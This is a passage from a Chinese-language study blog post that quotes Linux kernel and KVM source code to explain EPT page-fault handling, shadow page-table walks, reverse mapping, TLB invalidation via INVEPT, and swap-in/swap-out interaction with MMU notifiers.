class=\"line\">\t&#125;</span><br><span class=\"line\">retry:</span><br><span class=\"line\">\tvma = find_vma_intersection(current-&gt;mm, addr, addr + <span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (vma == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\tpfn = KVM_PFN_ERR_FAULT;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (vma-&gt;vm_flags &amp; (VM_IO | VM_PFNMAP)) &#123;</span><br><span class=\"line\">\t\tr = hva_to_pfn_remapped(vma, addr, async, write_fault, writable, &amp;pfn);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r == -EAGAIN)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">goto</span> retry;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\tpfn = KVM_PFN_ERR_FAULT;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (async &amp;&amp; vma_is_valid(vma, write_fault))</span><br><span class=\"line\">\t\t\t*async = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\tpfn = KVM_PFN_ERR_FAULT;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"built_in\">exit</span>:</span><br><span class=\"line\">\tup_read(&amp;current-&gt;mm-&gt;mmap_sem);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> pfn;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过mm模块的<code>find_vma_intersection</code>找到和[addr,addr+1)相交的VMA，如果不存在说明HVA是错的(用户态memslot申请的地址空间并没有用malloc或mmap获取)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">hva_to_pfn_remapped</span><span class=\"params\">(<span class=\"keyword\">struct</span> vm_area_struct *vma,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t       <span class=\"type\">unsigned</span> <span class=\"type\">long</span> addr, <span class=\"type\">bool</span> *async,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t       <span class=\"type\">bool</span> write_fault, <span class=\"type\">bool</span> *writable,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t       <span class=\"type\">kvm_pfn_t</span> *p_pfn)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">kvm_pfn_t</span> pfn;</span><br><span class=\"line\">\t<span class=\"type\">pte_t</span> *ptep;</span><br><span class=\"line\">\t<span class=\"type\">spinlock_t</span> *ptl;</span><br><span class=\"line\">\t<span class=\"type\">int</span> r;</span><br><span class=\"line\">\tr = follow_pte_pmd(vma-&gt;vm_mm, addr, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, &amp;ptep, <span class=\"literal\">NULL</span>, &amp;ptl);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (r) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">bool</span> unlocked = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\tr = fixup_user_fault(current, current-&gt;mm, addr,</span><br><span class=\"line\">\t\t\t\t     (write_fault ? FAULT_FLAG_WRITE : <span class=\"number\">0</span>), &amp;unlocked);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (unlocked)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> -EAGAIN;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">\t\tr = follow_pte_pmd(vma-&gt;vm_mm, addr, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, &amp;ptep, <span class=\"literal\">NULL</span>, &amp;ptl);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (write_fault &amp;&amp; !pte_write(*ptep)) &#123;</span><br><span class=\"line\">\t\tpfn = KVM_PFN_ERR_RO_FAULT;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (writable)</span><br><span class=\"line\">\t\t*writable = pte_write(*ptep);</span><br><span class=\"line\">\tpfn = pte_pfn(*ptep);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!kvm_try_get_pfn(pfn))</span><br><span class=\"line\">\t\tr = -EFAULT;</span><br><span class=\"line\">out:</span><br><span class=\"line\">\tpte_unmap_unlock(ptep, ptl);</span><br><span class=\"line\">\t*p_pfn = pfn;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __follow_pte_pmd(<span class=\"keyword\">struct</span> mm_struct *mm, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> address,</span><br><span class=\"line\">\t\t\t    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> *start, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> *end,</span><br><span class=\"line\">\t\t\t    <span class=\"type\">pte_t</span> **ptepp, <span class=\"type\">pmd_t</span> **pmdpp, <span class=\"type\">spinlock_t</span> **ptlp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">pgd_t</span> *pgd;</span><br><span class=\"line\">\t<span class=\"type\">p4d_t</span> *p4d;</span><br><span class=\"line\">\t<span class=\"type\">pud_t</span> *pud;</span><br><span class=\"line\">\t<span class=\"type\">pmd_t</span> *pmd;</span><br><span class=\"line\">\t<span class=\"type\">pte_t</span> *ptep;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpgd = pgd_offset(mm, address);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pgd_none(*pgd) || unlikely(pgd_bad(*pgd)))</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">\tp4d = p4d_offset(pgd, address);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p4d_none(*p4d) || unlikely(p4d_bad(*p4d)))</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpud = pud_offset(p4d, address);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pud_none(*pud) || unlikely(pud_bad(*pud)))</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpmd = pmd_offset(pud, address);</span><br><span class=\"line\">\tVM_BUG_ON(pmd_trans_huge(*pmd));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pmd_huge(*pmd)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!pmdpp)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (start &amp;&amp; end) &#123;</span><br><span class=\"line\">\t\t\t*start = address &amp; PMD_MASK;</span><br><span class=\"line\">\t\t\t*end = *start + PMD_SIZE;</span><br><span class=\"line\">\t\t\tmmu_notifier_invalidate_range_start(mm, *start, *end);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t*ptlp = pmd_lock(mm, pmd);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (pmd_huge(*pmd)) &#123;</span><br><span class=\"line\">\t\t\t*pmdpp = pmd;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tspin_unlock(*ptlp);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (start &amp;&amp; end)</span><br><span class=\"line\">\t\t\tmmu_notifier_invalidate_range_end(mm, *start, *end);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pmd_none(*pmd) || unlikely(pmd_bad(*pmd)))</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (start &amp;&amp; end) &#123;</span><br><span class=\"line\">\t\t*start = address &amp; PAGE_MASK;</span><br><span class=\"line\">\t\t*end = *start + PAGE_SIZE;</span><br><span class=\"line\">\t\tmmu_notifier_invalidate_range_start(mm, *start, *end);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tptep = pte_offset_map_lock(mm, pmd, address, ptlp);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!pte_present(*ptep))</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> unlock;</span><br><span class=\"line\">\t*ptepp = ptep;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">unlock:</span><br><span class=\"line\">\tpte_unmap_unlock(ptep, *ptlp);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (start &amp;&amp; end)</span><br><span class=\"line\">\t\tmmu_notifier_invalidate_range_end(mm, *start, *end);</span><br><span class=\"line\">out:</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//arch/arc/include/asm/pgtable.h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> pgd_index(addr)\t\t((addr) &gt;&gt; PGDIR_SHIFT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> pgd_offset(mm, addr)\t(((mm)-&gt;pgd)+pgd_index(addr))</span></span><br></pre></td></tr></table></figure>\n\n<p>pgd p4d pud pmd分别是一二三四级页表，直接通过一些宏直接来索引。</p>\n<p>这里通过内核中维护的当前进程的页表信息找到EPT中缺失的HVA-&gt;HPA，也就是说当前进程页表拥有的HVA-&gt;HPA映射处于某种原因没有被更新到EPT上</p>\n<p>如果进程页表中也不存在对应的页表项，说明对该进程发生了一般的page fault，调用</p>\n<p><code>fixup_user_fault</code>-&gt;<code>handle_mm_fault</code>-&gt;<code>__handle_mm_fault</code>处理</p>\n<p>内核mm模块保证了这时HPA对应的VMA、物理页、进程页表都存在且合法，后续把GVA-&gt;HPA加入EPT即可</p>\n<p>写保护？</p>\n<p>换页？</p>\n<h3 id=\"遍历页表\"><a href=\"#遍历页表\" class=\"headerlink\" title=\"遍历页表\"></a>遍历页表</h3><p>shadow_addr &#x3D; root_hpa &#x3D; EPT的基地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> for_each_shadow_entry(_vcpu, _addr, _walker)    \\</span></span><br><span class=\"line\"><span class=\"meta\">\tfor (shadow_walk_init(&amp;(_walker), _vcpu, _addr);\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t     shadow_walk_okay(&amp;(_walker));\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t     shadow_walk_next(&amp;(_walker)))</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">shadow_walk_init</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_shadow_walk_iterator *iterator,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t     <span class=\"keyword\">struct</span> kvm_vcpu *vcpu, u64 addr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\titerator-&gt;addr = addr;</span><br><span class=\"line\">\titerator-&gt;shadow_addr = vcpu-&gt;arch.mmu.root_hpa;</span><br><span class=\"line\">\titerator-&gt;level = vcpu-&gt;arch.mmu.shadow_root_level;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">bool</span> <span class=\"title function_\">shadow_walk_okay</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_shadow_walk_iterator *iterator)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (iterator-&gt;level &lt; PT_PAGE_TABLE_LEVEL)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\titerator-&gt;index = SHADOW_PT_INDEX(iterator-&gt;addr, iterator-&gt;level);</span><br><span class=\"line\">\titerator-&gt;sptep\t= ((u64 *)__va(iterator-&gt;shadow_addr)) + iterator-&gt;index;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">shadow_walk_next</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_shadow_walk_iterator *iterator)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__shadow_walk_next(iterator, *iterator-&gt;sptep);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> __shadow_walk_next(<span class=\"keyword\">struct</span> kvm_shadow_walk_iterator *iterator,</span><br><span class=\"line\">\t\t\t       u64 spte)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (is_last_spte(spte, iterator-&gt;level)) &#123;</span><br><span class=\"line\">\t\titerator-&gt;level = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\titerator-&gt;shadow_addr = spte &amp; PT64_BASE_ADDR_MASK;</span><br><span class=\"line\">\t--iterator-&gt;level;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>由于页表项和EPT基地址都记录的是物理地址，即HPA，这里访问都需要先转成虚拟地址即HVA来使用。</p>\n<h3 id=\"加入映射\"><a href=\"#加入映射\" class=\"headerlink\" title=\"加入映射\"></a>加入映射</h3><p><a href=\"https://blog.csdn.net/leoufung/article/details/52661968\">__direct_map 函数解析之影子页表的构建_direct map_leoufung的博客-CSDN博客</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __direct_map(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">gpa_t</span> gpa, <span class=\"type\">int</span> write,</span><br><span class=\"line\">\t\t\t<span class=\"type\">int</span> map_writable, <span class=\"type\">int</span> level, <span class=\"type\">kvm_pfn_t</span> pfn,</span><br><span class=\"line\">\t\t\t<span class=\"type\">bool</span> prefault, <span class=\"type\">bool</span> lpage_disallowed)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_shadow_walk_iterator</span> <span class=\"title\">it</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu_page</span> *<span class=\"title\">sp</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> ret;</span><br><span class=\"line\">\t<span class=\"type\">gfn_t</span> gfn = gpa &gt;&gt; PAGE_SHIFT;</span><br><span class=\"line\">\t<span class=\"type\">gfn_t</span> base_gfn = gfn;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!VALID_PAGE(vcpu-&gt;arch.mmu.root_hpa))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> RET_PF_RETRY;</span><br><span class=\"line\">\ttrace_kvm_mmu_spte_requested(gpa, level, pfn);</span><br><span class=\"line\">\tfor_each_shadow_entry(vcpu, gpa, it) &#123;</span><br><span class=\"line\">\t\tdisallowed_hugepage_adjust(it, gfn, &amp;pfn, &amp;level);</span><br><span class=\"line\">\t\tbase_gfn = gfn &amp; ~(KVM_PAGES_PER_HPAGE(it.level) - <span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (it.level == level)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\tdrop_large_spte(vcpu, it.sptep);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!is_shadow_present_pte(*it.sptep)) &#123;</span><br><span class=\"line\">\t\t\tsp = kvm_mmu_get_page(vcpu, base_gfn, it.addr,</span><br><span class=\"line\">\t\t\t\t\t      it.level - <span class=\"number\">1</span>, <span class=\"literal\">true</span>, ACC_ALL);</span><br><span class=\"line\">\t\t\tlink_shadow_page(vcpu, it.sptep, sp);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (lpage_disallowed)</span><br><span class=\"line\">\t\t\t\taccount_huge_nx_page(vcpu-&gt;kvm, sp);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tret = mmu_set_spte(vcpu, it.sptep, ACC_ALL,</span><br><span class=\"line\">\t\t\t   write, level, base_gfn, pfn, prefault,</span><br><span class=\"line\">\t\t\t   map_writable);</span><br><span class=\"line\">\tdirect_pte_prefetch(vcpu, it.sptep);</span><br><span class=\"line\">\t++vcpu-&gt;stat.pf_fixed;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>kvm_mmu_get_page</code>在不存在的情况下创建欣的页表页，<code>link_shadow_page</code>连接两级页表，<code>mmu_set_spte</code>在最后一级页表填入HPA</p>\n<p>遍历页表的循环动态补全了GPA对应的页表页，最后写入映射到HPA的页表项</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">rmap_add</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, u64 *spte, <span class=\"type\">gfn_t</span> gfn)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu_page</span> *<span class=\"title\">sp</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_rmap_head</span> *<span class=\"title\">rmap_head</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tsp = page_header(__pa(spte));</span><br><span class=\"line\">\tkvm_mmu_page_set_gfn(sp, spte - sp-&gt;spt, gfn);</span><br><span class=\"line\">\trmap_head = gfn_to_rmap(vcpu-&gt;kvm, gfn, sp);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> pte_list_add(vcpu, spte, rmap_head);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>并且会加入反向映射</p>\n<p><code>mmu_set_spte</code>-&gt;<code>kvm_flush_remote_tlbs</code>-&gt;<code>kvm_make_all_cpus_request(kvm, KVM_REQ_TLB_FLUSH)</code></p>\n<p><code>vcpu_enter_guest</code>-&gt;<code>kvm_vcpu_flush_tlb</code>-&gt;<code>vmx_flush_tlb</code>-&gt;<code>__vmx_flush_tlb</code>-&gt;<code>ept_sync_context(construct_eptp(vcpu, vcpu-&gt;arch.mmu.root_hpa));</code>-&gt;<code>__invept</code></p>\n<p>最后用到VMX的<code>INVEPT</code>指令 手册<code>28.3.3.4 Guidelines for Use of the INVEPT Instruction</code></p>\n<blockquote>\n<p> the INVEPT instruction to invalidate information cached from the  EPT paging structures.</p>\n</blockquote>\n<p>tlb存的是GVA-&gt;HPA 还是HVA-&gt;HPA不确定，和VMX在硬件上的具体实现有关，所以需要特殊VMX指令而不是普通flush tlb的指令例如<code>invlpg</code>而是仍然需要使用VMX扩展指令？</p>\n<h2 id=\"swap\"><a href=\"#swap\" class=\"headerlink\" title=\"swap\"></a>swap</h2><p><a href=\"https://zhuanlan.zhihu.com/p/588911110\">linux内核源码解析- 匿名页面生命周期 - 知乎 (zhihu.com)</a></p>\n<p><a href=\"https://www.openeuler.org/en/blog/liqunsheng/2020-11-26-swap.html\">Linux 中的内存交换 (openeuler.org)</a></p>\n<p><a href=\"https://www.cnblogs.com/LoyenWang/p/11827153.html\">【原创】（十）Linux内存管理 - zoned page frame allocator - 5 - LoyenWang - 博客园 (cnblogs.com)</a></p>\n<p>[<a href=\"https://blog.csdn.net/u010923083/article/details/116278456\">内核内存] [arm64] 内存回收4—shrink_node函数详解_shrink函数_早起的虫儿有鹰吃的博客-CSDN博客</a></p>\n<h3 id=\"swap-out\"><a href=\"#swap-out\" class=\"headerlink\" title=\"swap out\"></a>swap out</h3><p>mm&#x2F;vmscan.c <code>shrink_page_list</code> 高版本<code>shrink_folio_list</code></p>\n<p><code>shrink_page_list</code>-&gt;<code>rmap_walk</code>-&gt;<code>try_to_unmap_one</code> -&gt; <code>mmu_notifier_invalidate_range_start</code></p>\n<p>解映射(内核自己的  还有通知KVM EPT的)</p>\n<p><code>kvm_unmap_hva_range</code> <code>kvm_handle_hva_range</code> <code>kvm_unmap_rmapp</code> <code>kvm_zap_rmapp</code> <code>rmap_get_first</code> <code>drop_spte ``rmap_remove</code> <code>pte_list_remove</code></p>\n<p><code>page_vma_mapped_walk</code> 根据page结构体存的信息拿到对应的vma 再遍历页表拿到pte 最后unmap pte</p>\n<p><code>shrink_page_list</code>-&gt;<code>pageout</code> 写磁盘</p>\n<p>内核为了节约空间 先找VMA 再找pte 但是kvm是直接维护的spte</p>\n<p><img src=\"http://jake.dothome.co.kr/wp-content/uploads/2017/01/do_swap_page-1a.png\" alt=\"image\"></p>\n<p>[Linux中的Anonymous Pages和Swap <a href=\"https://zhuanlan.zhihu.com/p/70964551\">一] - 知乎 (zhihu.com)</a></p>\n<p>[Qemu-kvm memory 虚拟化 | Tian-Daye on the Way (xingguotian.github.io)](<a href=\"https://xingguotian.github.io/2019/08/23/qemu-kvm\">https://xingguotian.github.io/2019/08/23/qemu-kvm</a> 内存虚拟化&#x2F;)</p>\n<p><a href=\"http://www.wowotech.net/memory_management/reverse_mapping.html\">逆向映射的演进 (wowotech.net)</a></p>\n<p>建立反向映射：<a href=\"https://www.codenong.com/cs106477291/\">5. EPT机制 | 码农家园 (codenong.com)</a></p>\n<p>KVM的EPT维护一个rmap 反向映射</p>\n<p>KVM启动先向内核mm模块注册一个回调函数，内核发生swap会通知KVM处理</p>\n<p>解开反向映射：<a href=\"https://www.openeuler.org/en/blog/liqunsheng/2020-11-26-swap.html\">Linux 中的内存交换 (openeuler.org)</a></p>\n<h3 id=\"swap-in\"><a href=\"#swap-in\" class=\"headerlink\" title=\"swap in\"></a>swap in</h3><p><code>do_swap_page</code>-&gt;<code>do_wp_page</code>-&gt;<code>wp_page_copy</code>-&gt;<code>set_pte_at_notify</code>-&gt;<code>mmu_notifier_change_pte</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//mm/memory.c</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __handle_mm_fault(<span class=\"keyword\">struct</span> vm_area_struct *vma, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> address,</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> flags)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vm_fault</span> <span class=\"title\">vmf</span> =</span> &#123;</span><br><span class=\"line\">\t\t.vma = vma,</span><br><span class=\"line\">\t\t.address = address &amp; PAGE_MASK,</span><br><span class=\"line\">\t\t.flags = flags,</span><br><span class=\"line\">\t\t.pgoff = linear_page_index(vma, address),</span><br><span class=\"line\">\t\t.gfp_mask = __get_fault_gfp_mask(vma),</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> dirty = flags &amp; FAULT_FLAG_WRITE;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">mm_struct</span> *<span class=\"title\">mm</span> =</span> vma-&gt;vm_mm;</span><br><span class=\"line\">\t<span class=\"type\">pgd_t</span> *pgd;</span><br><span class=\"line\">\t<span class=\"type\">p4d_t</span> *p4d;</span><br><span class=\"line\">\t<span class=\"type\">int</span> ret;</span><br><span class=\"line\">\tpgd = pgd_offset(mm, address);</span><br><span class=\"line\">\tp4d = p4d_alloc(mm, pgd, address);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!p4d)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> VM_FAULT_OOM;</span><br><span class=\"line\">\tvmf.pud = pud_alloc(mm, p4d, address);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!vmf.pud)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> VM_FAULT_OOM;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">\tvmf.pmd = pmd_alloc(mm, vmf.pud, address);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!vmf.pmd)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> VM_FAULT_OOM;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> handle_pte_fault(&amp;vmf);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">handle_pte_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> vm_fault *vmf)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    vmf-&gt;pte = pte_offset_map(vmf-&gt;pmd, vmf-&gt;address);</span><br><span class=\"line\">    vmf-&gt;orig_pte = *vmf-&gt;pte;</span><br><span class=\"line\"> \t<span class=\"keyword\">if</span> (!pte_present(vmf-&gt;orig_pte))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> do_swap_page(vmf);   </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> pte_offset_map(dir,addr) pte_offset(dir, addr)</span></span><br><span class=\"line\">Expands to:</span><br><span class=\"line\">((<span class=\"type\">pte_t</span> *)(((((((*vmf-&gt;pmd).pud).pgd))) &amp; (~(((<span class=\"number\">1UL</span>) &lt;&lt; (<span class=\"number\">13</span>))<span class=\"number\">-1</span>)))) + (((vmf-&gt;address) &gt;&gt; <span class=\"number\">13</span>) &amp; (((<span class=\"number\">1UL</span>) &lt;&lt; ((<span class=\"number\">21</span> - <span class=\"number\">13</span>))) - <span class=\"number\">1</span>)))</span><br><span class=\"line\"><span class=\"comment\">//arch/arc/include/asm/pgtable.h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> pte_present(x)\t\t\t(pte_val(x) &amp; _PAGE_PRESENT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _PAGE_PRESENT       (1&lt;&lt;10)\t<span class=\"comment\">/* TLB entry is valid (H) */</span></span></span><br></pre></td></tr></table></figure>\n\n<p>虽然代码注释说的是TLB是否有效，但是<a href=\"https://www.kernel.org/doc/gorman/html/understand/understand006.html#3.1\">Page Table Management (kernel.org)</a>这个链接提到这个bit的意思是</p>\n<blockquote>\n<p> Page is resident in memory and not swapped out</p>\n</blockquote>\n<p>EPT并不是根据pte的bit判断swap，而是直接调用mm模块去处理，或者async直接返回用户态，挂起vcpu。</p>\n<p><a href=\"https://xingguotian.github.io/\">Tian-Daye on the Way (xingguotian.github.io)</a></p>\n<p><a href=\"https://blog.csdn.net/qiongtianliuyun/article/details/108295111\">Qemu-kvm memory 虚拟化_Cliff Yang的博客-CSDN博客</a></p>\n<blockquote>\n<p>调用hva_to_pfn时，如果这个函数判断是新分配的内存页，则表明该gfn到pfn的映射并未建立，如果内存页被交换到了磁盘上，则会设置async为true，这样tdp_page_fault就会成功返回，并将当前VCPU线程挂起来。——《QEMUKVM源码解析与应用》</p>\n</blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">kvm_pfn_t</span> <span class=\"title function_\">hva_to_pfn</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">long</span> addr, <span class=\"type\">bool</span> atomic, <span class=\"type\">bool</span> *async,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t<span class=\"type\">bool</span> write_fault, <span class=\"type\">bool</span> *writable)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vm_area_struct</span> *<span class=\"title\">vma</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">kvm_pfn_t</span> pfn = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> npages, r;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (hva_to_pfn_fast(addr, atomic, async, write_fault, writable, &amp;pfn))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> pfn;</span><br><span class=\"line\">\tnpages = hva_to_pfn_slow(addr, async, write_fault, writable, &amp;pfn);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (npages == <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> pfn;</span><br><span 